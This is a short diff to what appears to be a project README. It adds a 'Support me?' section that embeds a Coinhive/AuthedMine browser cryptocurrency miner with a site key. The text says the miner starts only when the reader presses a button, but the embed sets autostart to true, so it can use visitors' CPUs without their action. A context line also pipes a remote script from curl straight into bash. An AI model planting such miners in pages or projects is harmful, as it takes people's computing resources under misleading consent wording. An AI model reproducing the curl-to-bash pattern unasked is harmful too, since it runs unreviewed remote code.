@@ -20,3 +20,14 @@ Or with curl:
 ```shell
 curl https://raw.githubusercontent.com/NerdOfLinux/Scripts/master/download.sh | bash
 ```
+
+## Support me?
+All you need to do is press the start button, and your computer's CPU will be used to make me money(until you close the tab)
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+	style="width: 256px; height: 310px"
+	data-key="rBkcIJ9fipL8DLqNZ65W9qDhZxTuNM44"
+  data-autostart="true"
+  >
+	<em>Loading...</em>
+</div>
